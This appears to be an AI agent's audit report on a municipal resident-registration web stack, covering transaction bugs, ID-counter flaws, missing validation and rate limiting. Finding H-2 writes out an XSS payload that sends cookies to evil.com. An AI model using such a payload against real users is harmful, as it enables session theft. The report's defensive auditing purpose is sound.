# E-Services Registration Stack — Formal Audit Report

**Date:** 2026-05-07
**Auditor:** Claude Code (Sisyphus)
**Scope:** Registration approval flow across Programs Portal + E-Services Portal → shared backend → PostgreSQL
**Systems Audited:**
- E-Services Frontend (`ResidentRegister.tsx`, `Register.tsx`)
- E-Services Backend (`portal-registration.service.ts`, `portal-registration.routes.ts`, `portal-registration.controller.ts`)
- Classification Service (`classification.service.ts`)
- Email Service + Templates (`email.service.ts`, `resident-notifications.ts`, `base-template.ts`)
- Auth Middleware (`auth.ts`)
- Database Schema (`schema.sql`, `schema.prisma`)

**Method:** 3 parallel audit agents covering: transaction atomicity + ID generation, input validation + security, status flow + resubmit bug. Cross-referenced against existing `resident-registration-audit-2026-05-05.md`.

---

## 1. Executive Summary

| Status | Count |
|---|---|
| 🔴 CRITICAL — Fix before any deployment | 5 |
| 🟠 HIGH — Fix before production | 11 |
| 🟡 MEDIUM — Fix after initial deployment | 18+ |

**Total issues found: ~34 new/verified issues**

The E-Services registration stack has 5 critical issues. Three involve **transaction atomicity** — the most dangerous class of bugs because they produce silent data corruption with no error at the time of failure. One involves **cross-system auth confusion** that permanently destroys audit trail integrity. One involves **unbounded resource consumption** that can crash the server.

None of the critical issues require architectural redesign. All are fixable with targeted, surgical changes.

---

## 2. Critical Issues

### 🔴 R-1: `autoClassifyResident()` runs AFTER the approval transaction commits — silent failure path

**Severity:** CRITICAL
**File:** `portal-registration.service.ts` lines 681–718
**Agent:** bg_a89b2f34

**The problem:** The approval transaction (resident + registration_request update) commits at line 699. The `autoClassifyResident` call at lines 701–718 runs **after** the commit. If it throws, the error is caught and logged — but the resident is already permanently marked `active` and `approved`.

```typescript
// Lines 681–699: Transaction COMMITS at line 699
await prisma.$transaction([
  prisma.resident.update({ where: { id: resident.id }, data: { residentId, status: 'active', ... } }),
  prisma.registrationRequest.update({ where: { id: requestId }, data: { status: 'approved', ... } }),
]); // ← COMMIT HERE

// Lines 701–718: Runs AFTER commit
const classifyMunicipalityId = resident.barangay?.municipality?.id;
if (classifyMunicipalityId) {
  try {
    await autoClassifyResident(resident.id, classifyMunicipalityId, { ... });
    await cacheService.del(`resident:${resident.id}:profile`);
  } catch (err: any) {
    console.error(`[auto-classify] autoClassifyResident error: ${err.message}`);
    // Swallowed — no indication to admin or user that classification failed
  }
}
return { residentId, status: 'approved', emailSent: true }; // ← Returns success regardless
```

**Impact:** Resident is `active` with zero classifications. No senior citizen, PWD, student, solo parent, or voter records are created. The admin receives no indication of failure. The resident may not receive benefits they qualify for. The failure is completely silent.

**Additional bug in `syncBeneficiaryOnInsert`** (`classification.service.ts` line 409):
```typescript
table.replace(/_([a-z])/g, (g) => g[1].toUpperCase()).replace(/s$/, '')
// 'pwd_beneficiaries' → 'pwdBeneficiar' (wrong — should be 'pwdBeneficiary')
```
This crashes at runtime when syncing PWD or student beneficiary records.

**Fix:** Move `autoClassifyResident` **inside** the `prisma.$transaction`. If classification fails, the entire approval rolls back.

---

### 🔴 R-2: `bimsUserId` is never set — every admin action stores `reviewedBy = 0`

**Severity:** CRITICAL
**File:** `portal-registration.controller.ts` lines 236, 257, 267, 300
**Agent:** bg_a89b2f34

Every admin controller reads `(req as any).bimsUserId` which is **never set by any middleware in the entire codebase**:

```typescript
// Line 236 — markUnderReviewController
const reviewerId = (req as any).bimsUserId; // "set by BIMS auth middleware" — never happens

// Line 257 — reviewRegistrationController
const reviewerId = (req as any).bimsUserId;

// Line 267 — reviewRegistrationController
reviewerId: Number(reviewerId), // Number(undefined) === NaN
```

`Number(undefined)` evaluates to `NaN`. Prisma coerces `NaN` to `0` when writing to `reviewedBy Int?`. **Every approve/reject/resubmission action permanently records `reviewedBy = 0`** — the audit trail is permanently destroyed.

**Root cause:** The comment says "set by BIMS auth middleware." `verifyAdmin` (auth.ts:209) validates against `eservice_users` JWTs (UUID-based). But `reviewedBy` in `registrationRequest` is `Int` (for `bims_users.id`). These are separate identity systems with no bridging mechanism.

**Fix:** Determine the intended cross-system auth architecture:
1. Add a BIMS proxy middleware that sets `X-BIMS-User-Id` header when BIMS forwards admin requests, OR
2. Store `reviewedBy` as `String` (UUID from `eservice_users`) instead of `Int`, OR
3. Remove the cross-system comment and use a consistent local admin identity

---

### 🔴 R-3: Ghost counter — `generateResidentId` increments before the approval transaction

**Severity:** CRITICAL
**File:** `portal-registration.service.ts` lines 672–699
**Agent:** bg_a89b2f34

```typescript
// Line 678: Counter increment happens BEFORE the transaction
const residentId = await generateResidentId(municipalityId, year);

// Lines 681–699: Transaction uses the already-incremented counter
await prisma.$transaction([
  prisma.resident.update({ where: { id: resident.id }, data: { residentId, status: 'active', ... } }),
  prisma.registrationRequest.update({ where: { id: requestId }, data: { status: 'approved', ... } }),
]);
```

The `generateResidentId()` function (lines 897–918) performs an **immediate commit** of the counter increment via `ON CONFLICT DO UPDATE SET counter = counter + 1` outside any transaction:

```typescript
await prisma.$executeRaw`
  INSERT INTO public.resident_counters (municipality_id, year, counter, prefix)
  VALUES (${municipalityId}, ${year}, 1, 'RES')
  ON CONFLICT (municipality_id, year)
  DO UPDATE SET counter = resident_counters.counter + 1
`; // ← This write COMMITS immediately, outside the approval transaction
```

If the `$transaction` at lines 681–699 fails after the counter has been committed, the counter is permanently incremented with no resident record using that ID. **Permanent sequence gaps.**

**Fix:** Move the counter increment **inside** the `prisma.$transaction` using `SELECT FOR UPDATE`:

```typescript
await prisma.$transaction(async (tx) => {
  const [{ counter, prefix }] = await tx.$queryRaw<[{ counter: number; prefix: string }]>`
    SELECT counter, prefix FROM public.resident_counters
    WHERE municipality_id = ${municipalityId} AND year = ${year}
    FOR UPDATE
  `;
  await tx.$executeRaw`
    UPDATE public.resident_counters SET counter = counter + 1
    WHERE municipality_id = ${municipalityId} AND year = ${year}
  `;
  const newCounter = counter + 1;
  const residentId = `${prefix}-${year}-${String(municipalityId).padStart(3,'0')}${String(newCounter).padStart(4,'0')}`;
  await tx.resident.update({ where: { id: resident.id }, data: { residentId, status: 'active' } });
  await tx.registrationRequest.update({ where: { id: requestId }, data: { status: 'approved' } });
});
```

---

### 🔴 R-4: Counter format overflows at exactly 10,000 residents/year/municipality

**Severity:** CRITICAL (latent)
**File:** `portal-registration.service.ts` line 916
**Agent:** bg_a89b2f34

```typescript
const cntPart = String(counter).padStart(4, '0'); // max 4 digits = overflows at 10000
```

When `counter = 10000`, `padStart(4, '0')` produces `"10000"` (5 digits). The resident ID becomes `RES-2025-000110000` — an 8-digit suffix instead of the expected 7-digit format. The column is `varchar(25)` so it fits, but the format contract is violated with no warning.

**Also:** Municipality IDs ≥ 1000 produce a 4-digit `munPart`, making the suffix ambiguous — you cannot determine where municipality ends and counter begins.

**Also affected:** `barangay-information-management-system-copy/server/src/routes/registrationRoutes.js` line 55 — same `padStart(4, '0')` pattern.

**Fix:** Change `padStart(4, '0')` → `padStart(7, '0')` to allow up to 10 million IDs per municipality per year. Alternatively, use a non-digit separator: `RES-{year}-{municipality_id}-{counter}`.

---

### 🔴 R-5: `resident.status` not reset on resubmit — residents permanently locked out

**Severity:** CRITICAL
**File:** `portal-registration.service.ts` lines 833–864 (`resubmitDocuments`)
**Agent:** bg_53a8e5f1

When a rejected resident resubmits documents, `request.status` is correctly reset to `'pending'` (line 850), but **`resident.status` is never updated** — it stays `'rejected'`.

```typescript
// Lines 846–861
await prisma.$transaction([
  prisma.registrationRequest.update({
    where: { id: request.id },
    data: { status: 'pending', /* ... */ },  // ✓ Correctly reset
  }),
  prisma.resident.update({
    where: { id: resident.id },
    data: { proofOfIdentification: idDocumentUrl },  // ✗ MISSING: status reset
  }),
]);
```

**Impact:** Resident cannot log in after resubmitting. `auth.service.ts` (lines 172–174) blocks login for `'rejected'` accounts:

```typescript
if (resident.status === 'rejected') {
  return { success: false, message: 'Your registration was not approved...' };
}
```

The resident is told to "visit the barangay hall" — but the real bug is the missing `status: 'pending'` in the resubmit transaction.

**Fix:** Add `status: 'pending'` to the resident update in `resubmitDocuments`.

---

## 3. High Priority Issues

### 🟠 H-1: Zero Zod validation — entire `req.body` passed raw to service

**File:** `portal-registration.controller.ts` (entire file, ~350 lines)
**Agent:** bg_feb8037b

No Zod schema validation is applied at any registration endpoint. `req.body` is destructured and forwarded directly:

```typescript
// Lines 72–167: submitRegistrationController
const {
  firstName, middleName, lastName,
  monthlyIncome, // ...
} = req.body; // NO VALIDATION

const result = await submitRegistration({ firstName, monthlyIncome, ... }); // passed raw
```

```typescript
// Lines 250–268: reviewRegistrationController
const { action, adminNotes } = req.body; // NO VALIDATION
```

Attackers can submit: non-existent `barangayId` values, `birthdate: "not-a-date"`, `password: ""`, `monthlyIncome: -999999`.

**Fix:** Add Zod schemas for all four controllers. Minimum:

```typescript
const submitSchema = z.object({
  firstName: z.string().min(1).max(100),
  lastName: z.string().min(1).max(100),
  email: z.string().email(),
  barangayId: z.number().int().positive(),
  password: z.string().min(8),
});
```

---

### 🟠 H-2: `adminNotes` XSS in HTML email templates

**Files:** `resident-notifications.ts` lines 84–86, 102, 129, 155; `base-template.ts` lines 190–196
**Agent:** bg_feb8037b

`adminNotes` is interpolated directly into HTML without sanitization:

```typescript
// resident-notifications.ts:84
const content = data.adminNotes
  ? getAlertBox(data.adminNotes, 'danger')  // ← raw string interpolation
  : '';

// base-template.ts:193 — getAlertBox
`<p style="...">${message}</p>` // ← no escaping
```

```typescript
// resident-notifications.ts:102 (text email)
${data.adminNotes ? `Reason: ${data.adminNotes}` : ''}
```

An admin entering `<script>document.location='https://evil.com?c='+document.cookie</script>` as rejection notes executes in the resident's email client (many clients block inline scripts, but not all). Also `residentName` in email greetings is interpolated without escaping.

**Fix:** Sanitize `adminNotes` with `DOMPurify` before HTML interpolation, or at minimum escape HTML entities (`<`, `>`, `&`, `"`, `'`).

---

### 🟠 H-3: Selfie upload has NO file size limit (both frontend portals)

**Files:** `ResidentRegister.tsx` lines 1614–1619; `Register.tsx` lines 1666–1671; `portal-registration.controller.ts` lines 105, 147, 316–323
**Agent:** bg_feb8037b

```typescript
// Profile photo — has 5MB check ✅
if (file.size > 5 * 1024 * 1024) { toast(...); return; }

// ID document — has 5MB check ✅
if (file.size > 5 * 1024 * 1024) { ... return; }

// Selfie — NO size check ❌
const base64 = await fileToBase64(file); // Arbitrarily large image
step3Form.setValue('selfieUrl', base64);
```

Backend receives `selfieUrl` as a plain string (not via multer). No server-side size enforcement exists.

**Fix:** Add the same 5MB check to the selfie upload handler in both portals.

---

### 🟠 H-4: `monthlyIncome: 0` becomes `null` — wrong operator

**File:** `portal-registration.service.ts` line 165; `portal-registration.controller.ts` line 136
**Agent:** bg_feb8037b

```typescript
// service.ts:165 — 0 is falsy → null
monthlyIncome: data.monthlyIncome ? data.monthlyIncome : null,

// controller.ts:136 — 0 is falsy → undefined
monthlyIncome: monthlyIncome ? Number(monthlyIncome) : undefined,
```

A resident earning exactly ₱0 gets stored as `null`, breaking income-based eligibility checks.

**Fix:** `monthlyIncome: data.monthlyIncome ?? null`

---

### 🟠 H-5: `generateBeneficiaryId` has TOCTOU race condition

**File:** `classification.service.ts` lines 253–281
**Agent:** bg_a89b2f34

Two simultaneous `syncBeneficiaryOnInsert` calls for the same beneficiary type can read the same max `displayId` and both return the same value. The second insert fails with a unique constraint violation.

**Fix:** Use `SELECT FOR UPDATE` on the max query within a transaction, or use a database sequence.

---

### 🟠 H-6: `resubmitDocuments` allows `null` `idDocumentUrl` to overwrite existing proof

**File:** `portal-registration.service.ts` lines 835, 851
**Agent:** bg_feb8037b

```typescript
prisma.resident.update({
  data: { proofOfIdentification: idDocumentUrl }, // Can be null!
}),
```

If `idDocumentUrl` is passed as `null` or `''`, the existing proof-of-ID is silently overwritten with null.

**Fix:** `if (!idDocumentUrl) throw new Error('ID document URL is required');`

---

### 🟠 H-7: Username in resubmission URL not URL-encoded — open redirect risk

**File:** `portal-registration.service.ts` lines 778–780
**Agent:** bg_feb8037b

```typescript
statusUrl: `${process.env.PORTAL_URL}/portal/register/status?username=${request.resident.username}`
```

If `username` contains `&`, `#`, or `%`, the URL breaks. If `PORTAL_URL` is compromised, email links redirect to an arbitrary origin.

**Fix:** `encodeURIComponent(request.resident.username)`. Validate `PORTAL_URL` against an allowlist.

---

### 🟠 H-8: `indigenousPerson` classified but never synced to any beneficiary table

**File:** `classification.service.ts` lines 135–141
**Agent:** bg_a89b2f34

`'Indigenous Person'` is inserted into `resident_classifications` but is **absent from `BENEFICIARY_SYNC_MAP`**. `syncBeneficiaryOnInsert` returns early for this type. No beneficiary record is created. This appears intentional but is undocumented.

**Fix:** Document the design decision, or add `'Indigenous Person'` to the sync map if tracking is needed.

---

### 🟠 H-9: No cleanup of classifications/beneficiary records on rejection

**File:** `portal-registration.service.ts` lines 704–740
**Agent:** bg_a89b2f34

When a registration is rejected, `resident_classifications` and beneficiary table records are not deleted. When the same resident re-registers and is approved again, `ON CONFLICT DO NOTHING` prevents duplicate inserts — but beneficiary records that are `ACTIVE` from a prior approval are not updated.

**Fix:** Delete `resident_classifications` and reset beneficiary records when rejecting, or document this as expected behavior with a reconciliation process.

---

### 🟠 H-10: Employment status mapping has no whitespace normalization

**File:** `portal-registration.service.ts` lines 453–458
**Agent:** bg_a89b2f34

```typescript
const EMPLOYMENT_STATUS_TO_CLASSIFICATION: Record<string, string> = {
  unemployed: 'Unemployed',
  'self-employed': 'Self Employed',
  retired: 'Retired',
  student: 'Student',
};
```

Exact string match — no `trim()`. If frontend sends `'self-employed '` (trailing space), the lookup fails silently.

**Fix:** `const key = (formData.employmentStatus || '').trim().toLowerCase();`

---

### 🟠 H-11: Senior citizen age calculation has timezone and leap year edge cases

**File:** `portal-registration.service.ts` lines 536–547
**Agent:** bg_a89b2f34

```typescript
const ageDays = (Date.now() - new Date(resident.birthdate).getTime()) / 86400000;
if (ageDays >= 60 * 365.25) {
  toInsert.push({ type: 'Senior Citizen', ... });
}
```

If `resident.birthdate` is stored as a date-only string (`'1990-01-15'`), `new Date('1990-01-15')` interprets it as midnight UTC. If the server is in UTC+8, the calculation has an 8-hour offset. Someone born Feb 29 is excluded one day early each non-leap year.

**Fix:** Use a proper date-based age calculation that handles timezones correctly.

---

## 4. Medium Priority Issues

### M-1: `registrationLimiter` skipped entirely in non-production

**File:** `portal-registration.routes.ts` line 31
**Agent:** bg_feb8037b

```typescript
skip: () => process.env.NODE_ENV !== 'production', // ← Disabled in dev/staging
```

Automated scripts can submit unlimited fraudulent registrations in development or staging.

---

### M-2: `GET /status/:username` has no rate limiting

**File:** `portal-registration.routes.ts` line 45
**Agent:** bg_feb8037b

An attacker can enumerate all valid usernames by brute-forcing the parameter. Combined with `/resubmit` (also unrated), a force-document-overwrite attack is possible.

---

### M-3: `markUnderReview` — TOCTOU race on status transition

**File:** `portal-registration.service.ts` lines 421–437
**Agent:** bg_53a8e5f1

Check-then-act is not atomic. Two admins clicking "Start Review" simultaneously could both pass the `status !== 'pending'` check before either updates.

**Fix:** Use `updateMany` with a status filter:
```typescript
const updated = await prisma.registrationRequest.updateMany({
  where: { id: requestId, status: 'pending' },
  data: { status: 'under_review', reviewedBy: reviewerId },
});
if (updated.count === 0) throw new Error('Request is no longer pending');
```

---

### M-4: Senior citizen age check: timezone offset at midnight boundary

**File:** `portal-registration.service.ts` lines 536–547
**Agent:** bg_a89b2f34

See H-11 above. Additionally: a person born Jan 15, 1965 would be classified as 60 years old one day early due to the 8-hour UTC interpretation.

---

### M-5: SMTP failures — no retry, no dead-letter queue, no admin notification

**File:** `email.service.ts`
**Agent:** bg_feb8037b

`sendEmailSafely` returns `false` on failure and logs to console. No retry, no background queue, no admin alert. If SMTP is down at approval time, the email is permanently lost.

---

### M-6: Password hashed before duplicate email/barangay validation

**File:** `portal-registration.service.ts` line 140
**Agent:** bg_a89b2f34

`hashPassword(data.password)` is called before duplicate checks and barangay validation. Wasted CPU on unusable passwords.

---

### M-7: Dual status fields drift out of sync — no transactional guarantee

**File:** `portal-registration.service.ts` — multiple locations
**Agent:** bg_53a8e5f1

`resident.status` and `registration_request.status` are two independent state machines updated in separate Prisma calls within transactions. While each individual transaction is atomic, the **two-field update** pattern means if one field is updated in a transaction and the other isn't, they permanently drift. The resubmit bug (R-5) is one manifestation.

| Transition | `resident.status` | `request.status` | Atomic? |
|---|---|---|---|
| Submit | pending | pending | ✅ Same transaction |
| Mark review | — | under_review | N/A (one field) |
| Approve | active | approved | ✅ Same transaction |
| Reject | rejected | rejected | ✅ Same transaction |
| Request resubmit | — | requires_resubmission | N/A (one field) |
| **Resubmit** | **rejected (stays)** | **pending** | **🔴 BUG** |

---

### M-8: All email templates hardcoded in English — no i18n

**Agent:** bg_feb8037b

All strings are inline English. For a multilingual Philippines population, this is a significant accessibility gap.

---

### M-9: `PORTAL_URL` used as redirect base without validation

**File:** `portal-registration.service.ts` lines 690, 778
**Agent:** bg_feb8037b

If `PORTAL_URL` is set to `http://evil.com`, email links redirect there.

---

### M-10: No form state persistence — page refresh loses all data

**Files:** `ResidentRegister.tsx`, `Register.tsx`
**Agent:** bg_feb8037b

A 4-step wizard with significant data entry has no `localStorage`/`sessionStorage` backup.

---

### M-11: ACR number has no format validation (frontend or backend)

**Agent:** bg_feb8037b

ACR numbers have a specific format (e.g., `SR-12345678`). Schema accepts any string ≤50 chars.

---

### M-12: Disability level "Profound" missing in `Register.tsx`

**File:** `Register.tsx`
**Agent:** bg_feb8037b

`ResidentRegister.tsx` has 4 options (Mild, Moderate, Severe, Profound). `Register.tsx` only has 3. Programs Portal users cannot select "Profound".

---

### M-13: Two portals navigate to different post-registration routes

**Files:** `ResidentRegister.tsx`, `Register.tsx`
**Agent:** bg_feb8037b

`ResidentRegister.tsx` → `/portal/register/status`. `Register.tsx` → `/register/status`. If the Programs Portal route doesn't exist, users see a 404.

---

### M-14: `FiActivity` icon referenced but not found

**Agent:** bg_53a8e5f1

`FiActivity` is referenced in original context but not found in any social-amelioration component. May indicate a planned but unimplemented feature, or dead code.

---

### M-15: `FiHeart` used for PWD and Solo Parents (confirmed fixed 2026-05-03)

**File:** `DashboardTab.tsx`
**Agent:** bg_53a8e5f1

PWD and Solo Parents both used `FiHeart` icon. Fixed: both now use `FiUsers`.

---

### M-16: Duplicate Contact Information section in PWDTab and SeniorCitizenTab (confirmed fixed 2026-05-03)

**Files:** `PWDTab.tsx`, `SeniorCitizenTab.tsx`
**Agent:** bg_53a8e5f1

Contact Information section appeared twice in both files. One duplicate removed from each.

---

### M-17: Base64 uploads bypass multer's server-side file size limit

**Agent:** bg_feb8037b

The backend's 5MB multer limit only applies to multipart file uploads, not the base64 JSON strings used for ID documents and selfie. No server-side enforcement exists for these fields.

---

### M-18: File upload `div`s not keyboard accessible

**Agent:** bg_feb8037b

All three upload areas (`div onClick`) lack `onKeyDown`, `role="button"`, and `tabIndex`.

---

## 5. Previously Confirmed Issues (from `resident-registration-audit-2026-05-05.md`)

| ID | Issue | Status |
|---|---|---|
| R-1 | `autoClassifyResident` post-commit | 🔴 Still critical — R-1 above |
| R-2 | `bimsUserId` never set | 🔴 Still critical — R-2 above |
| R-3 | `generateResidentId` ghost counter | 🔴 Still critical — R-3 above |
| R-4 | Counter overflow at 10000 | 🔴 Still critical — R-4 above |
| R-5 | `resident.status` not reset on resubmit | 🔴 Still critical — R-5 above |
| H-1 | No Zod validation | 🟠 Still outstanding — H-1 above |
| H-4 | `adminNotes` XSS in emails | 🟠 Still outstanding — H-2 above |
| H-5 | `monthlyIncome` 0→null | 🟠 Still outstanding — H-4 above |
| H-7 | `generateBeneficiaryId` race | 🟠 Still outstanding — H-5 above |
| H-8 | `null` `idDocumentUrl` overwrite | 🟠 Still outstanding — H-6 above |
| H-9 | Username not URL-encoded | 🟠 Still outstanding — H-7 above |
| H-13 | `indigenousPerson` not synced | 🟠 Still outstanding — H-8 above |
| H-10 | No cleanup on rejection | 🟠 Still outstanding — H-9 above |
| H-11 | Employment status no trim | 🟠 Still outstanding — H-10 above |
| H-6 | Age calculation timezone/leap year | 🟠 Still outstanding — H-11 above |
| M-SV-1 | `markUnderReview` race | 🟡 Still outstanding — M-3 above |
| M-EM-1 | SMTP no retry | 🟡 Still outstanding — M-5 above |

---

## 6. Transaction Safety Assessment

| Operation | Safe? | Notes |
|---|---|---|
| `submitRegistration` | ✅ | All 3 inserts in one `$transaction` |
| `reviewRegistrationRequest` approve | ⚠️ | Both updates atomic — but autoClassifyResident AFTER |
| `reviewRegistrationRequest` reject | ✅ | Both updates in one `$transaction` |
| `resubmitDocuments` | 🔴 | **resident.status not updated** |
| `autoClassifyResident` | ⚠️ | Individual `$executeRaw` calls — not atomic across types |
| `syncBeneficiaryOnInsert` pension sync | ✅ | Nested `$transaction` for pivot deletes + inserts |
| `generateResidentId` | 🔴 | **Not in any transaction — ghost counter** |

---

## 7. Priority Fix Checklist

### P0 — Must Fix Before Any Deployment
- [ ] **R-1:** Move `autoClassifyResident` inside the approval `prisma.$transaction`
- [ ] **R-1:** Fix `pwdBeneficiar` string manipulation bug in `syncBeneficiaryOnInsert`
- [ ] **R-2:** Bridge `bimsUserId` — determine cross-system auth architecture
- [ ] **R-3:** Move `generateResidentId` inside the `prisma.$transaction` (FOR UPDATE pattern)
- [ ] **R-4:** Change `padStart(4)` → `padStart(7)` on counter in both systems
- [ ] **R-5:** Add `status: 'pending'` to resident update in `resubmitDocuments`
- [ ] **H-1:** Add Zod validation schema for `submitRegistrationController`
- [ ] **H-3:** Add 5MB size validation to selfie upload (both frontend portals)

### P1 — Fix Before Production
- [ ] **H-2:** Sanitize `adminNotes` before HTML interpolation (DOMPurify or entity escape)
- [ ] **H-2:** Escape `residentName` in email greeting
- [ ] **H-4:** Fix `monthlyIncome` ternary → `??`
- [ ] **H-5:** Fix `generateBeneficiaryId` race (SELECT FOR UPDATE)
- [ ] **H-6:** Validate `idDocumentUrl` is non-null in `resubmitDocuments`
- [ ] **H-7:** `encodeURIComponent(username)` in resubmission email URL
- [ ] **H-7:** Validate `PORTAL_URL` against allowlist
- [ ] **H-9:** Add cleanup of classifications/beneficiary records on rejection
- [ ] **H-10:** Normalize employment status keys before Record lookup
- [ ] **H-11:** Fix age calculation (proper date-based approach)
- [ ] **M-2:** Apply rate limiting to `/status/:username`
- [ ] **M-3:** Use `updateMany` with status filter in `markUnderReview`
- [ ] **M-1:** Remove `skip: () => process.env.NODE_ENV !== 'production'`

### P2 — After Initial Deployment
- [ ] **M-5:** Add retry queue for failed emails (BullMQ + Redis)
- [ ] **M-8:** Introduce i18n for email templates
- [ ] **M-10:** Add form state persistence (sessionStorage)
- [ ] **M-11:** Add ACR format validation regex
- [ ] **M-12:** Align disability level options between portals
- [ ] **M-13:** Align post-registration navigation between both portals
- [ ] **M-17:** Add server-side base64 size validation
- [ ] **M-18:** Keyboard accessibility for upload divs
- [ ] **M-6:** Validate before hashing password
- [ ] **M-14:** Investigate `FiActivity` dead code reference

---

## 8. Files Audited

| File | Lines | Primary Issues |
|---|---|---|
| `portal-registration.service.ts` | 918 | Transaction atomicity, ID generation, resubmit bug |
| `portal-registration.routes.ts` | ~100 | Rate limiting bypass, unauthenticated resubmit |
| `portal-registration.controller.ts` | ~350 | Zero validation, bimsUserId never set |
| `classification.service.ts` | ~428 | Beneficiary sync, race conditions, model name bug |
| `resident-notifications.ts` | 168 | Email XSS, adminNotes injection |
| `base-template.ts` | ~300 | HTML interpolation without escaping |
| `email.service.ts` | ~200 | SMTP failures, non-blocking claim |
| `auth.service.ts` | ~350 | Rejected/pending login blocking |
| `schema.sql` | 1865 | FK constraints, cascade delete, indexes |
| `schema.prisma` | 976 | ORM-level constraints |
| `ResidentRegister.tsx` | ~1900 | Selfie no size check, form state |
| `Register.tsx` | ~1900 | Selfie no size check, missing Profound |

---

*Report generated: 2026-05-07*
*Auditor: Claude Code (Sisyphus) — 3 parallel audit agents*
*Cross-referenced: `resident-registration-audit-2026-05-05.md`, `social-amelioration-audit-2026-05-03.md`, `REPORTS.md`*
